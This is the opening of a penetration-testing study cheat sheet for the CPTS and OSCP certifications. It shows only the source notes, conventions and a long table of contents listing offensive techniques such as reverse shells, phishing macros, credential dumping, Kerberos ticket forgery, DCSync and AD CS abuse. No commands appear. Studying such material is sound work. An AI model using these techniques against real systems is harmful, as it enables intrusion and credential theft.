# CPTS Cheat Sheet

HackTheBox Certified Penetration Tester Specialist (CPTS) and Offensive Security Certified Professional (OSCP) notes — reorganized, deduplicated, and sanitized.

> **Source:** adapted from the CPTS cheatsheet and merged OSCP references. This branch (`oscp-branch2`) keeps the same technical material in a consistent, study-friendly structure.
>
> **Merged sources:** [sword0x00/CPTS-cheatsheet (oscp-cheatsheet)](https://github.com/sword0x00/CPTS-cheatsheet/tree/oscp-cheatsheet), [0xsyr0/OSCP](https://github.com/0xsyr0/OSCP), and [lagarian.smith/oscp-cheat-sheet](https://gitlab.com/lagarian.smith/oscp-cheat-sheet). Content is reorganized into the numbered sections below and deduplicated; upstream links are preserved.
>
> **No credentials are stored in this document.** Passwords, hashes, keys, tokens, and session IDs have been replaced with placeholders such as `<PASSWORD>`, `<NTLM_HASH>`, and `<API_TOKEN>`.

## Conventions

- `A>` — command run on the attack host.
- `V>` — command run on the victim/target host.
- `<PLACEHOLDER>` — replace with the value for your engagement (IP, username, password, hash, etc.).
- `#` — comment; commands are shown as they should be typed.
- `crackmapexec`/`cme` examples keep their original name; the maintained fork is **NetExec** (`nxc`).

## Table of Contents

<details>
<summary>Expand / collapse the full outline</summary>

- [Conventions](#conventions)
- [1. Tmux](#1-tmux)
  - [Tmux Commands](#tmux-commands)
- [2. Nmap](#2-nmap)
  - [Enumeration Methodology](#enumeration-methodology)
  - [Address Scanning](#address-scanning)
  - [Scan Techniques](#scan-techniques)
  - [Host Discovery](#host-discovery)
  - [Port Scanning](#port-scanning)
  - [OS & Service Detection](#os--service-detection)
  - [Timing & Performance](#timing--performance)
  - [NSE Scripts](#nse-scripts)
  - [Firewall Evasion & Spoofing](#firewall-evasion--spoofing)
  - [Output](#output)
  - [Recon Commands](#recon-commands)
- [3. Service Footprinting](#3-service-footprinting)
  - [Infrastructure & OSINT Enumeration](#infrastructure--osint-enumeration)
  - [Domain, Cloud & Staff Enumeration](#domain-cloud--staff-enumeration)
  - [FTP (21/tcp)](#ftp-21tcp)
  - [MSRPC (135/tcp)](#msrpc-135tcp)
  - [SMB (139, 445/tcp)](#smb-139-445tcp)
    - [Download multiple files at once](#download-multiple-files-at-once)
  - [Rpcbind (111/tcp)](#rpcbind-111tcp)
  - [NFS (2049/tcp)](#nfs-2049tcp)
  - [DNS (53/tcp, 53/udp)](#dns-53tcp-53udp)
  - [SMTP (25/tcp)](#smtp-25tcp)
  - [IMAP & POP3 (143/993, 110/995/tcp)](#imap--pop3-143993-110995tcp)
  - [SNMP (161/udp)](#snmp-161udp)
  - [MySQL (3306/tcp)](#mysql-3306tcp)
  - [MSSQL (1433/tcp)](#mssql-1433tcp)
  - [Oracle TNS (1521/tcp)](#oracle-tns-1521tcp)
  - [IPMI (623/udp)](#ipmi-623udp)
  - [Remote Management](#remote-management)
    - [Using outdated Algorithms](#using-outdated-algorithms)
    - [Error Handling](#error-handling)
    - [Fixing SSH Private Key](#fixing-ssh-private-key)
  - [Memcached (11211/tcp)](#memcached-11211tcp)
  - [NetBIOS](#netbios)
  - [SSH (22/tcp)](#ssh-22tcp)
  - [TFTP (69/udp)](#tftp-69udp)
  - [Finger (79/tcp)](#finger-79tcp)
  - [ISAKMP/IKE (500/udp)](#isakmpike-500udp)
  - [Rlogin (513/tcp)](#rlogin-513tcp)
  - [Fortinet SSL VPN (541/tcp)](#fortinet-ssl-vpn-541tcp)
  - [RTSP (554/tcp)](#rtsp-554tcp)
  - [Rsync (873/tcp)](#rsync-873tcp)
  - [MSRPC Alternate Ports (1030/1032/1033/1038)](#msrpc-alternate-ports-1030103210331038)
  - [PostgreSQL (5432/tcp)](#postgresql-5432tcp)
  - [Erlang Port Mapper (4369/tcp)](#erlang-port-mapper-4369tcp)
  - [Redis (6379/tcp)](#redis-6379tcp)
  - [MSDeploy (8172/tcp)](#msdeploy-8172tcp)
  - [MongoDB (27017/tcp)](#mongodb-27017tcp)
  - [Unknown Service Ports](#unknown-service-ports)
- [4. Web Reconnaissance](#4-web-reconnaissance)
  - [WHOIS](#whois)
  - [WhatWeb](#whatweb)
  - [Virtual Hosts](#virtual-hosts)
  - [Certificate Transparency (crt.sh)](#certificate-transparency-crtsh)
  - [Banner Grabbing](#banner-grabbing)
  - [WAF Detection](#waf-detection)
  - [Nikto](#nikto)
  - [ReconSpider](#reconspider)
  - [Automated Reconnaissance](#automated-reconnaissance)
  - [Crawling, robots.txt, .well-known & Archives](#crawling-robotstxt-well-known--archives)
  - [HTTPS (443/tcp)](#https-443tcp)
- [5. File Transfers](#5-file-transfers)
  - [Windows](#windows)
    - [Download Operations](#download-operations)
    - [Upload Operations](#upload-operations)
  - [Linux](#linux)
    - [Download Operations](#download-operations-1)
    - [Upload Operations](#upload-operations-1)
  - [Transferring Files with Code](#transferring-files-with-code)
    - [Python](#python)
    - [PHP](#php)
    - [Ruby](#ruby)
    - [Perl](#perl)
    - [JavaScript](#javascript)
    - [VBScript](#vbscript)
    - [Python 3 Upload](#python-3-upload)
    - [Certutil](#certutil)
    - [Netcat](#netcat)
    - [Impacket](#impacket)
    - [PowerShell](#powershell)
    - [Bash only](#bash-only)
    - [wget version](#wget-version)
    - [curl version](#curl-version)
  - [Miscellaneous](#miscellaneous)
    - [Netcat & Ncat](#netcat--ncat)
    - [PowerShell Sessions](#powershell-sessions)
    - [RDP Drive Redirection](#rdp-drive-redirection)
  - [Protected File Transfers](#protected-file-transfers)
    - [Windows Encryption](#windows-encryption)
    - [Linux Encryption](#linux-encryption)
  - [Receiving Files over HTTP/S](#receiving-files-over-https)
    - [Nginx — Enabling PUT](#nginx--enabling-put)
  - [Living off the Land](#living-off-the-land)
    - [LOLBAS — Certreq Upload](#lolbas--certreq-upload)
    - [GTFOBins — OpenSSL Download](#gtfobins--openssl-download)
    - [Bitsadmin Download](#bitsadmin-download)
    - [Certutil Download](#certutil-download)
    - [GfxDownloadWrapper Download](#gfxdownloadwrapper-download)
    - [WinHttpRequest (COM)](#winhttprequest-com)
    - [Msxml2 (COM)](#msxml2-com)
    - [BITS (COM)](#bits-com)
  - [Detection & Evasion](#detection--evasion)
  - [PHP Webserver](#php-webserver)
  - [File Enumeration & Analysis](#file-enumeration--analysis)
    - [Common](#common)
    - [Disk files](#disk-files)
    - [Images](#images)
    - [Audio](#audio)
  - [Privilege Escalation Transfer Setup](#privilege-escalation-transfer-setup)
    - [Set up Webserver](#set-up-webserver)
    - [Set up FTP Server](#set-up-ftp-server)
    - [Set up TFTP](#set-up-tftp)
- [6. Shells](#6-shells)
  - [Reverse Shell](#reverse-shell)
    - [Bash Reverse Shell](#bash-reverse-shell)
    - [curl Reverse Shell](#curl-reverse-shell)
    - [Groovy (Jenkins) Reverse Shell](#groovy-jenkins-reverse-shell)
    - [JAVA Reverse Shell](#java-reverse-shell)
    - [shell.jar](#shelljar)
    - [Lua Reverse Shell](#lua-reverse-shell)
    - [Markdown Reverse Shell](#markdown-reverse-shell)
    - [mkfifo Reverse Shell](#mkfifo-reverse-shell)
    - [Netcat Reverse Shell](#netcat-reverse-shell)
    - [Perl Reverse Shell](#perl-reverse-shell)
    - [PHP Reverse Shell](#php-reverse-shell)
    - [PowerShell Reverse Shell](#powershell-reverse-shell)
    - [minireverse.ps1](#minireverseps1)
    - [Python Reverse Shell](#python-reverse-shell)
    - [Ruby Reverse Shell](#ruby-reverse-shell)
  - [Bind Shell](#bind-shell)
  - [Web Shell](#web-shell)
    - [PHP Web Shell](#php-web-shell)
  - [TTY Upgrade](#tty-upgrade)
  - [Payloads, MSFvenom & Web Shells](#payloads-msfvenom--web-shells)
  - [Penelope](#penelope)
  - [pwncat](#pwncat)
  - [Microsoft Office Word Phishing Macro](#microsoft-office-word-phishing-macro)
    - [Payload](#payload)
    - [Encoding](#encoding)
    - [Alternatively using pwsh](#alternatively-using-pwsh)
    - [Python Script for Formatting](#python-script-for-formatting)
    - [Final Macro](#final-macro)
  - [Microsoft Windows Library Files](#microsoft-windows-library-files)
    - [Installation of wsgidav](#installation-of-wsgidav)
    - [config.Library-ms](#configlibrary-ms)
    - [Shortcut File](#shortcut-file)
    - [Send Phishing Email](#send-phishing-email)
    - [PHP into JPG Injection](#php-into-jpg-injection)
  - [Bad YAML](#bad-yaml)
  - [Payload References](#payload-references)
- [7. Password Attacks](#7-password-attacks)
  - [Password Mutations](#password-mutations)
  - [Remote Password Attacks](#remote-password-attacks)
  - [Windows Credential Harvesting](#windows-credential-harvesting)
    - [Common Commands](#common-commands)
    - [Dump Hashes](#dump-hashes)
    - [Pass the Ticket](#pass-the-ticket)
    - [Forging Golden Ticket](#forging-golden-ticket)
    - [Skeleton Key](#skeleton-key)
  - [Linux Credential Hunting](#linux-credential-hunting)
  - [Cracking Passwords](#cracking-passwords)
  - [Login Brute Forcing (Hydra)](#login-brute-forcing-hydra)
  - [Hashing, John & Hashcat](#hashing-john--hashcat)
    - [Custom Rules](#custom-rules)
    - [Add a 1 to each Password](#add-a-1-to-each-password)
    - [Capitalize first character](#capitalize-first-character)
    - [Add nothing, a 1 or a ! to an existing Wordlist](#add-nothing-a-1-or-a--to-an-existing-wordlist)
    - [Rule for upper case Letter, numerical Value and special Character](#rule-for-upper-case-letter-numerical-value-and-special-character)
    - [Rule Preview](#rule-preview)
    - [Cracking ASPREPRoast Password File](#cracking-aspreproast-password-file)
    - [Cracking Kerberoasting Password File](#cracking-kerberoasting-password-file)
    - [Bruteforce based on the Pattern](#bruteforce-based-on-the-pattern)
    - [Generate Password Candidates: Wordlist + Pattern](#generate-password-candidates-wordlist--pattern)
    - [Generate NetNLTMv2 with internalMonologue and crack with hashcat](#generate-netnltmv2-with-internalmonologue-and-crack-with-hashcat)
    - [Result](#result)
    - [Crack with hashcat](#crack-with-hashcat)
    - [Rules](#rules)
    - [Cracking with OneRuleToRuleThemAll.rule](#cracking-with-oneruletorulethemallrule)
  - [Credential Access & Lateral Movement](#credential-access--lateral-movement)
  - [Medusa & Custom Wordlists](#medusa--custom-wordlists)
  - [Attack Types, Policy & Defense](#attack-types-policy--defense)
  - [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
    - [gpp-decrypt](#gpp-decrypt)
  - [Kerbrute](#kerbrute)
    - [User Enumeration](#user-enumeration)
    - [Password Spray](#password-spray)
  - [Spray-Passwords](#spray-passwords)
    - [Spray-Passwords.ps1](#spray-passwordsps1)
    - [Usage](#usage)
  - [Wordlist Resources](#wordlist-resources)
  - [Password Brute Force](#password-brute-force)
  - [Wordlist Generation](#wordlist-generation)
    - [Bash](#bash)
    - [CeWL](#cewl)
    - [CUPP](#cupp)
    - [crunch](#crunch)
    - [JavaScript Quick Wordlist](#javascript-quick-wordlist)
    - [Mutate Wordlists](#mutate-wordlists)
    - [Username Anarchy](#username-anarchy)
- [8. Pivoting, Tunneling & Port Forwarding](#8-pivoting-tunneling--port-forwarding)
  - [SSH Local Port Forwarding](#ssh-local-port-forwarding)
    - [Chisel](#chisel)
    - [Reverse Pivot](#reverse-pivot)
    - [LHOST](#lhost)
    - [APPLICATION SERVER](#application-server)
    - [SOCKS5 / Proxychains Configuration](#socks5--proxychains-configuration)
    - [Ligolo-ng](#ligolo-ng)
    - [Download Proxy and Agent](#download-proxy-and-agent)
    - [Prepare Tunnel Interface](#prepare-tunnel-interface)
    - [Setup Proxy on LHOST](#setup-proxy-on-lhost)
    - [Setup Agent on APPLICATION SERVER](#setup-agent-on-application-server)
    - [Configure Session](#configure-session)
    - [Port Forwarding](#port-forwarding)
    - [Socat](#socat)
    - [SSH Tunneling](#ssh-tunneling)
    - [Local Port Forwarding](#local-port-forwarding)
    - [Dynamic Port Forwarding](#dynamic-port-forwarding)
    - [Remote Port Forwarding](#remote-port-forwarding)
    - [Remote Dynamic Port Forwarding](#remote-dynamic-port-forwarding)
    - [sshuttle](#sshuttle)
    - [ssh.exe](#sshexe)
    - [WINDOWS JUMP SERVER](#windows-jump-server)
    - [Plink](#plink)
    - [Netsh](#netsh)
  - [SSH Dynamic Port Forwarding (SOCKS)](#ssh-dynamic-port-forwarding-socks)
  - [SSH Remote/Reverse Port Forwarding](#ssh-remotereverse-port-forwarding)
  - [Meterpreter Tunneling & Port Forwarding](#meterpreter-tunneling--port-forwarding)
  - [Socat Redirection — Reverse Shell](#socat-redirection--reverse-shell)
  - [Socat Redirection — Bind Shell](#socat-redirection--bind-shell)
  - [Rpivot](#rpivot)
  - [Windows netsh Port Proxy](#windows-netsh-port-proxy)
  - [Dnscat2 DNS Tunneling](#dnscat2-dns-tunneling)
  - [Chisel SOCKS5](#chisel-socks5)
    - [Build and Serve](#build-and-serve)
    - [Reverse SOCKS Proxy (Pivot as Server)](#reverse-socks-proxy-pivot-as-server)
    - [Chisel Reverse Pivot (Attack Host as Server)](#chisel-reverse-pivot-attack-host-as-server)
  - [ICMP Tunneling (ptunnel-ng)](#icmp-tunneling-ptunnel-ng)
  - [Windows & Additional Pivoting](#windows--additional-pivoting)
- [9. Attacking Common Services](#9-attacking-common-services)
  - [Service Misconfigurations & Sensitive Information](#service-misconfigurations--sensitive-information)
  - [FTP](#ftp)
  - [SMB](#smb)
  - [SQL (MySQL & MSSQL)](#sql-mysql--mssql)
    - [Show Database Content](#show-database-content)
    - [OPENQUERY](#openquery)
    - [Binary Extraction as Base64](#binary-extraction-as-base64)
    - [Steal NetNTLM Hash / Relay Attack](#steal-netntlm-hash--relay-attack)
    - [Linked SQL Server Enumeration](#linked-sql-server-enumeration)
    - [xp_cmdshell](#xp_cmdshell)
    - [Read/Write using OPENROWSET](#readwrite-using-openrowset)
    - [Update User Password](#update-user-password)
    - [Drop a Shell](#drop-a-shell)
    - [Insert Code to get executed](#insert-code-to-get-executed)
    - [Write SSH Key into authorized_keys2 file](#write-ssh-key-into-authorized_keys2-file)
  - [RDP](#rdp)
  - [DNS](#dns)
  - [Email (SMTP & POP3)](#email-smtp--pop3)
  - [impacket-mssqlclient](#impacket-mssqlclient)
    - [Common Commands](#common-commands-1)
    - [Connection](#connection)
  - [MongoDB](#mongodb)
    - [User Password Reset to "12345"](#user-password-reset-to-12345)
  - [NoSQL Injection](#nosql-injection)
  - [PostgreSQL](#postgresql)
    - [Postgres Remote Code Execution](#postgres-remote-code-execution)
  - [Redis](#redis)
    - [Enter own SSH Key](#enter-own-ssh-key)
  - [Common Injections](#common-injections)
    - [MySQL & MariaDB](#mysql--mariadb)
    - [Get Number of Columns](#get-number-of-columns)
    - [Get Version](#get-version)
    - [Get Database Name](#get-database-name)
    - [Get Table Name](#get-table-name)
    - [Get Column Name](#get-column-name)
    - [Read a File](#read-a-file)
    - [Dump Data](#dump-data)
    - [Create Webshell](#create-webshell)
    - [MSSQL](#mssql)
    - [Authentication Bypass](#authentication-bypass)
    - [Get Version with Time-Based Injection](#get-version-with-time-based-injection)
    - [Enable xp_cmdshell](#enable-xp_cmdshell)
    - [Remote Code Execution (RCE)](#remote-code-execution-rce)
    - [Orcale SQL](#orcale-sql)
    - [SQLite](#sqlite)
    - [Extracting Table Names](#extracting-table-names)
    - [Extracting User Table](#extracting-user-table)
    - [Error-based SQL Injection (SQLi)](#error-based-sql-injection-sqli)
    - [UNION-based SQL Injection (SQLi)](#union-based-sql-injection-sqli)
    - [Manual Injection Steps](#manual-injection-steps)
    - [Blind SQL Injection (SQLi)](#blind-sql-injection-sqli)
  - [SQLite3](#sqlite3)
  - [sqsh (MSSQL)](#sqsh-mssql)
    - [List Files and Folders with xp_dirtree](#list-files-and-folders-with-xp_dirtree)
- [10. Active Directory](#10-active-directory)
  - [Initial Enumeration](#initial-enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Enumeration using PowerView](#enumeration-using-powerview)
    - [Service Principal Name (SPN) Enumeration](#service-principal-name-spn-enumeration)
    - [Object Permission Enumeration](#object-permission-enumeration)
    - [Share Enumeration](#share-enumeration)
    - [Credential Harvesting](#credential-harvesting)
    - [Cached Credentials](#cached-credentials)
    - [Timeroasting](#timeroasting)
    - [Script Modification](#script-modification)
    - [Modified timecrack.py](#modified-timecrackpy)
    - [Execution](#execution)
    - [Silver Tickets](#silver-tickets)
    - [Prerequisites](#prerequisites)
    - [Silver Ticket Forgery](#silver-ticket-forgery)
    - [Domain Controller Synchronization (DCSync)](#domain-controller-synchronization-dcsync)
    - [Domain Controller Synchonization Execution](#domain-controller-synchonization-execution)
    - [Lateral Movement](#lateral-movement)
    - [Windows Management Instrumentation (WMI)](#windows-management-instrumentation-wmi)
    - [Spawning Process](#spawning-process)
    - [Store Credentials](#store-credentials)
    - [Instanciate Distributed Component Object MOdel (DCOM)](#instanciate-distributed-component-object-model-dcom)
    - [Creating Payload](#creating-payload)
    - [revshell_encoder.py](#revshell_encoderpy)
    - [Payload Encoding](#payload-encoding)
    - [Windows Remote Shell (WinRS)](#windows-remote-shell-winrs)
    - [PowerShell](#powershell-1)
    - [PsExec](#psexec)
    - [Pass the Hash (PtH)](#pass-the-hash-pth)
    - [Overpass the Hash](#overpass-the-hash)
    - [Pass the Ticket](#pass-the-ticket-1)
    - [Exporting the Ticket](#exporting-the-ticket)
    - [Distributed Component Object Model (DCOM)](#distributed-component-object-model-dcom)
    - [Creating and storing the Distributed Component Object Model](#creating-and-storing-the-distributed-component-object-model)
    - [Active Directory Persistence](#active-directory-persistence)
    - [Golden Tickets](#golden-tickets)
    - [Forge and Inject Golden Ticket](#forge-and-inject-golden-ticket)
    - [Volume Shadow Service (VSS) aka Shadow Copies](#volume-shadow-service-vss-aka-shadow-copies)
    - [Create and collect necessary Files](#create-and-collect-necessary-files)
  - [LLMNR/NBT-NS Poisoning](#llmnrnbt-ns-poisoning)
  - [Password Spraying & Password Policy](#password-spraying--password-policy)
  - [Enabling & Bypassing Security Controls](#enabling--bypassing-security-controls)
  - [Credentialed Enumeration](#credentialed-enumeration)
    - [From Linux](#from-linux)
    - [From Windows](#from-windows)
    - [Modules](#modules)
    - [Null Session](#null-session)
    - [Guest Account](#guest-account)
    - [Local Authenitcation](#local-authenitcation)
    - [Kerberos](#kerberos)
    - [Kerberos Authentication](#kerberos-authentication)
    - [Generate TGT](#generate-tgt)
    - [Generate krb5.conf](#generate-krb5conf)
    - [Password Spraying](#password-spraying)
    - [SMB Protocol](#smb-protocol)
    - [SMB Share Enumeration](#smb-share-enumeration)
    - [Download Files](#download-files)
    - [File Handling](#file-handling)
    - [RID Brute Force](#rid-brute-force)
    - [Vulnerability Scanning](#vulnerability-scanning)
    - [System Enumeration](#system-enumeration)
    - [Credentials Dumping](#credentials-dumping)
    - [Change User Password](#change-user-password)
    - [Change Password of a different User](#change-password-of-a-different-user)
    - [Command Execution](#command-execution)
    - [LDAP](#ldap)
    - [Domain Enumeration](#domain-enumeration)
    - [Find Domain SID](#find-domain-sid)
    - [Forest Trust Enumeration](#forest-trust-enumeration)
    - [LDAP Queries](#ldap-queries)
    - [Domain Access Control List (DACL) Enumeration](#domain-access-control-list-dacl-enumeration)
    - [ASREPRoast](#asreproast)
    - [Delegation](#delegation)
    - [Find Delegation](#find-delegation)
    - [Find Unconstrained Delegation](#find-unconstrained-delegation)
    - [WinRM](#winrm)
    - [MSSQL](#mssql-1)
    - [Privilege Escalation](#privilege-escalation)
    - [SSH](#ssh)
    - [FTP](#ftp-1)
    - [RDP](#rdp-1)
    - [Take Screenshot](#take-screenshot)
    - [WMI](#wmi)
    - [NFS](#nfs)
    - [Escape to root File System](#escape-to-root-file-system)
  - [Living off the Land (Windows)](#living-off-the-land-windows)
    - [Basic Host Enumeration](#basic-host-enumeration)
    - [PowerShell Enumeration](#powershell-enumeration)
    - [Firewall & Defender Checks](#firewall--defender-checks)
    - [Logged-on Users](#logged-on-users)
    - [Network Information](#network-information)
    - [WMI Enumeration](#wmi-enumeration)
    - [Net Commands](#net-commands)
    - [Dsquery](#dsquery)
  - [Kerberoasting](#kerberoasting)
    - [General Notes](#general-notes)
    - [Bruteforce](#bruteforce)
    - [With List of Users](#with-list-of-users)
    - [Check Passwords for all Users in Domain](#check-passwords-for-all-users-in-domain)
    - [ASPREPRoast](#aspreproast)
    - [Check ASPREPRoast for all Domain Users (Credentials required)](#check-aspreproast-for-all-domain-users-credentials-required)
    - [Check ASPREPRoast for a List of Users (No Credentials required)](#check-aspreproast-for-a-list-of-users-no-credentials-required)
    - [Check ASPREPRoast for all Domain Users in Domain](#check-aspreproast-for-all-domain-users-in-domain)
    - [Overpass The Hash/Pass The Key (PTK)](#overpass-the-hashpass-the-key-ptk)
    - [Request TGT with Hash](#request-tgt-with-hash)
    - [Request TGT with aesKey (More secure Encryption, probably more stealth due is it used by Default)](#request-tgt-with-aeskey-more-secure-encryption-probably-more-stealth-due-is-it-used-by-default)
    - [Request TGT with Password](#request-tgt-with-password)
    - [Set TGT for Impacket Usage](#set-tgt-for-impacket-usage)
    - [Execute Remote Commands](#execute-remote-commands)
    - [Ask and inject the Ticket](#ask-and-inject-the-ticket)
    - [Execute a CMD on Remote Host](#execute-a-cmd-on-remote-host)
    - [Pass The Ticket (PTT)](#pass-the-ticket-ptt)
    - [Harvest Tickets from Linux](#harvest-tickets-from-linux)
    - [Check Type and Location of Tickets](#check-type-and-location-of-tickets)
    - [Harvest Tickets from Windows](#harvest-tickets-from-windows)
    - [Convert Tickets dumped with Rubeus into base64](#convert-tickets-dumped-with-rubeus-into-base64)
    - [Convert Tickets between Linux and Windows Format with ticket_converter.py](#convert-tickets-between-linux-and-windows-format-with-ticket_converterpy)
    - [Using Ticket on Linux](#using-ticket-on-linux)
    - [Execute Remote Commands by using TGT](#execute-remote-commands-by-using-tgt)
    - [Using Ticket on Windows](#using-ticket-on-windows)
    - [Inject Ticket with mimikatz](#inject-ticket-with-mimikatz)
    - [Inject Ticket with Rubeus](#inject-ticket-with-rubeus)
    - [Impacket Examples](#impacket-examples)
    - [Generate TGS with NTLM](#generate-tgs-with-ntlm)
    - [Generate TGS with aesKey](#generate-tgs-with-aeskey)
    - [Set the ticket for impacket use](#set-the-ticket-for-impacket-use)
    - [mimikatz Examples](#mimikatz-examples)
    - [Generate TGS with AES 128bit Key](#generate-tgs-with-aes-128bit-key)
    - [Generate TGS with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)](#generate-tgs-with-aes-256bit-key-more-secure-encryption-probably-more-stealth-due-is-it-used-by-default)
    - [Inject TGS with Mimikatz](#inject-tgs-with-mimikatz)
    - [Rubeus Examples](#rubeus-examples)
    - [Execute CMD on Remote Host](#execute-cmd-on-remote-host)
    - [Generate TGT with NTLM](#generate-tgt-with-ntlm)
    - [Generate TGT with aesKey](#generate-tgt-with-aeskey)
    - [Generate TGT with AES 128bit Key](#generate-tgt-with-aes-128bit-key)
    - [Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)](#generate-tgt-with-aes-256bit-key-more-secure-encryption-probably-more-stealth-due-is-it-used-by-default)
    - [Inject TGT with Mimikatz](#inject-tgt-with-mimikatz)
    - [Get NTLM from Password](#get-ntlm-from-password)
  - [ACL Enumeration & Abuse](#acl-enumeration--abuse)
  - [DCSync](#dcsync)
  - [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
  - [AS-REP Roasting](#as-rep-roasting)
  - [Child → Parent Trusts (ExtraSids)](#child--parent-trusts-extrasids)
    - [Enumeration](#enumeration)
    - [ExtraSids — Mimikatz](#extrasids--mimikatz)
    - [ExtraSids — Rubeus](#extrasids--rubeus)
    - [DCSync from the Child Domain](#dcsync-from-the-child-domain)
    - [From Linux (Impacket)](#from-linux-impacket)
  - [Cross-Forest Trusts](#cross-forest-trusts)
    - [From Windows](#from-windows-1)
    - [From Linux](#from-linux-1)
  - [AD Tooling, External Recon & Advanced Attacks](#ad-tooling-external-recon--advanced-attacks)
    - [Domain & External Enumeration Commands](#domain--external-enumeration-commands)
    - [Privileged Access & Lateral Movement](#privileged-access--lateral-movement)
    - [Kerberos Double Hop](#kerberos-double-hop)
    - [Bleeding-Edge AD Vulnerabilities](#bleeding-edge-ad-vulnerabilities)
    - [ADIDNS, GPP & GPO Enumeration](#adidns-gpp--gpo-enumeration)
    - [AD Auditing & Hardening](#ad-auditing--hardening)
  - [Account Operators Group Membership](#account-operators-group-membership)
    - [Add User](#add-user)
    - [Import PowerView](#import-powerview)
    - [Add DCSync Rights](#add-dcsync-rights)
  - [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
    - [ESC1: Misconfigured Certificate Templates](#esc1-misconfigured-certificate-templates)
    - [ESC2: Misconfigured Certificate Templates](#esc2-misconfigured-certificate-templates)
    - [ESC3: Enrollment Agent Templates](#esc3-enrollment-agent-templates)
    - [ESC4: Vulnerable Certificate Template Access Control](#esc4-vulnerable-certificate-template-access-control)
    - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2](#esc6-editf_attributesubjectaltname2)
    - [ESC7: Vulnerable Certificate Authority Access Control](#esc7-vulnerable-certificate-authority-access-control)
    - [ESC8: NTLM Relay to AD CS HTTP Endpoints](#esc8-ntlm-relay-to-ad-cs-http-endpoints)
    - [Coercing](#coercing)
    - [ESC9: No Security Extensions](#esc9-no-security-extensions)
    - [Alternative via Computer Object and Email](#alternative-via-computer-object-and-email)
    - [ESC10: Weak Certificate Mappings](#esc10-weak-certificate-mappings)
    - [Case 1](#case-1)
    - [Case 2](#case-2)
    - [ESC11: IF_ENFORCEENCRYPTICERTREQUEST](#esc11-if_enforceencrypticertrequest)
    - [ESC12: YubiHSM2 Vulnerability (Specific Context)](#esc12-yubihsm2-vulnerability-specific-context)
    - [ESC13: Issuance Policy with Privileged Group Linked](#esc13-issuance-policy-with-privileged-group-linked)
    - [ESC14: Weak Explicit Certificate Mapping](#esc14-weak-explicit-certificate-mapping)
    - [Scenario B: Target with X509RFC822 (email)](#scenario-b-target-with-x509rfc822-email)
    - [ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")](#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)
    - [Scenario A: Direct Impersonation via Schannel (Injecting "Client Authentication" Application Policy)](#scenario-a-direct-impersonation-via-schannel-injecting-client-authentication-application-policy)
    - [Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)](#scenario-b-pkinitkerberos-impersonation-via-enrollment-agent-abuse-injecting-certificate-request-agent-application-policy)
    - [ESC16: Security Extension Disabled on CA (Globally)](#esc16-security-extension-disabled-on-ca-globally)
    - [Scenario A: With UPN Manipulation (in Compatibility Mode - StrongCertificateBindingEnforcement = 1 or 0)](#scenario-a-with-upn-manipulation-in-compatibility-mode---strongcertificatebindingenforcement--1-or-0)
    - [Scenario B: Combined with ESC6 (CA allows SAN specification via request attributes)](#scenario-b-combined-with-esc6-ca-allows-san-specification-via-request-attributes)
    - [ESC16 + ESC6](#esc16--esc6)
    - [ESC6: CA allows SAN specification via request attributes](#esc6-ca-allows-san-specification-via-request-attributes)
    - [ESC17: Server Authentication Template Abuse](#esc17-server-authentication-template-abuse)
    - [Template Creation Abuse through dangerous CA Permissions](#template-creation-abuse-through-dangerous-ca-permissions)
    - [Create Certificate Template](#create-certificate-template)
    - [Error Handling](#error-handling-1)
    - [Fixing Username or domain is not specified, and identity information was not found in the certificate Error](#fixing-username-or-domain-is-not-specified-and-identity-information-was-not-found-in-the-certificate-error)
    - [Fixing Object SID mismatch between certificate and user 'Administrator' Error](#fixing-object-sid-mismatch-between-certificate-and-user-administrator-error)
    - [Fixing Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template Error](#fixing-got-error-while-requesting-certificate-code-0x80094811---certsrv_e_key_length---the-public-key-does-not-meet-the-minimum-size-required-by-the-specified-certificate-template-error)
    - [Account Creation](#account-creation)
    - [Authentication](#authentication)
    - [LDAP-Shell](#ldap-shell)
    - [Certificate Forging](#certificate-forging)
    - [Certificate Request](#certificate-request)
    - [Revert Changes](#revert-changes)
    - [Start BloodHound Fork](#start-bloodhound-fork)
  - [ADMiner](#adminer)
  - [BloodHound-Legacy](#bloodhound-legacy)
    - [Installing and starting Database](#installing-and-starting-database)
    - [Docker Container](#docker-container)
    - [Database Password Reset](#database-password-reset)
  - [bloodyAD](#bloodyad)
    - [Get](#get)
    - [Set](#set)
    - [Add](#add)
    - [Remove](#remove)
  - [enum4linux-ng](#enum4linux-ng)
  - [Evil-WinRM](#evil-winrm)
  - [JAWS](#jaws)
  - [ldapsearch](#ldapsearch)
  - [Microsoft Windows](#microsoft-windows)
    - [Basic Microsoft Windows Enumeration](#basic-microsoft-windows-enumeration)
    - [Access Control](#access-control)
    - [S-R-X-Y Example](#s-r-x-y-example)
    - [SID Table](#sid-table)
    - [accesschk](#accesschk)
    - [Checking File Permissions](#checking-file-permissions)
    - [Checking Service Permissions](#checking-service-permissions)
    - [Checking Path Permissions to find Unquoted Service Paths](#checking-path-permissions-to-find-unquoted-service-paths)
    - [Checking Registry Entries](#checking-registry-entries)
    - [Show hidden Files and Folders](#show-hidden-files-and-folders)
    - [Show installed Applications](#show-installed-applications)
    - [User Handling](#user-handling)
    - [Adding Users to Groups](#adding-users-to-groups)
    - [Quick Wins](#quick-wins)
    - [Search for Passwords](#search-for-passwords)
    - [PowerShell History](#powershell-history)
    - [Saved Windows Credentials](#saved-windows-credentials)
    - [Winlogon Credentials](#winlogon-credentials)
    - [Local Administrator Password Solution (LAPS)](#local-administrator-password-solution-laps)
    - [Search the Registry for Passwords](#search-the-registry-for-passwords)
    - [Dumping Credentials](#dumping-credentials)
    - [Find KeePass Databases](#find-keepass-databases)
    - [Internet Information Service (IIS)](#internet-information-service-iis)
    - [PuTTY](#putty)
    - [Unattended Windows Installations](#unattended-windows-installations)
    - [Enable WinRM](#enable-winrm)
